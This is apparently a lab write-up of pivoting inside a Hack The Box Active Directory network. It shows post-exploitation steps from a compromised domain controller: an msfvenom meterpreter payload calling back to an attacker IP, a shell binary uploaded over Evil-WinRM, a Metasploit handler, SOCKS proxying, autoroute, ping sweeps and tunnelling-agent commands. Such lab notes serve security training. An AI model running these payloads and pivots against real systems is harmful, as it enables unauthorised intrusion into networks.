### Others suggest...

We can get a clue that there's another Domain controller from [172.16.1.20(DC01)](../172.16.1.20(DC01).md).
Given that, I was supposed to find the new network segent.
However, it didn't work when I tried...
So let's just skip the finding process, and start working on next step.

### What I did

Assuming that we have another network segment 172.16.2.0/24.
Let's scan what hosts exist in the network.

##### Find hosts

```perl
C:\Windows\system32> for /L %i in (1,1,254) do @ping -n 1 -w 1000 172.16.2.%i | find "Reply from" && echo 172.16.2.%i is reachable
 
for /L %i in (1,1,254) do @ping -n 1 -w 1000 172.16.2.%i | find "Reply from" && echo 172.16.2.%i is reachable
Reply from 172.16.2.5: bytes=32 time<1ms TTL=127
172.16.2.5 is reachable
```

##### Pivoting via meterpreter autoroute

First, create a bind-shell payload.

```bash
┌──(kali㉿kali)-[~/htb/DC01]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=9000 -f psh -o rshell.ps1  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of psh file: 3231 bytes
Saved as: rshell.ps1
```

Upload it on DC01 and run it(after run msfconsole).

```powershell
*Evil-WinRM* PS C:\Users\katwamba\Documents> upload bind_shell.exe
Info: Uploading /home/kali/htb/DC01/bind_shell.exe to C:\Users\katwamba\Documents\bind_shell.exe
Data: 9556 bytes of 9556 bytes copied
Info: Upload successful!



*Evil-WinRM* PS C:\Users\katwamba\Documents> .\bind_shell.exe
```

Run msfconsole.

```bash
┌──(kali㉿kali)-[~/htb/DC01]
└─$ msfconsole
Metasploit tip: To save all commands executed since start up to a file, use the 
makerc command

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 > set LPORT 4444
msf6 > set RHOST 172.16.1.20

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > options

Payload options (windows/x64/meterpreter/bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LPORT     4444             yes       The listen port
   RHOST     172.16.1.20      no        The target address

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 172.16.1.20:4444
[*] Sending stage (201798 bytes) to 172.16.1.20
[*] Meterpreter session 1 opened (192.168.45.131:32871 -> 172.16.1.20:4444) at 2025-01-08 14:04:07 -0500

meterpreter >
```

Then I ran `autoroute` to enable pivoting.

Set SOCKS Proxy.

```bash
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
SRVPORT => 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) > 
[*] Starting the SOCKS proxy server
```

Set `autoroute`.

```bash
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION  1                yes       The session to run this module on
   SUBNET   172.16.2.0       no        Subnet (IPv4, for example, 10.10.10.0)

View the full module info with the info, or info -d command.

msf6 post(multi/manage/autoroute) > run

[*] Running module against DANTE-DC01
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.1.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
```

Set `proxychains` on kali.

```bash
vi /etc/proxychains.conf

socks5 127.0.0.1 1080
```





Ping sweep for 172.16.1.0/24

```sql
msf6 > use multi/gather/ping_sweep
msf6 post(multi/gather/ping_sweep) > options

Module options (post/multi/gather/ping_sweep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       IP Range to perform ping sweep against.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/gather/ping_sweep) > set RHOSTS 172.16.1.0/24
RHOSTS => 172.16.1.0/24
msf6 post(multi/gather/ping_sweep) > set SESSION 1
SESSION => 1
msf6 post(multi/gather/ping_sweep) > run

[*] Performing ping sweep for IP range 172.16.1.0/24
[+]     172.16.1.5 host found
[+]     172.16.1.17 host found
[+]     172.16.1.13 host found
[+]     172.16.1.19 host found
[+]     172.16.1.10 host found
[+]     172.16.1.12 host found
[+]     172.16.1.20 host found
[+]     172.16.1.101 host found
[+]     172.16.1.102 host found
[+]     172.16.1.100 host found
[*] Post module execution completed
```





listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

listener_list

. .\agent.exe -connect 172.16.1.100:11601 -ignore-cert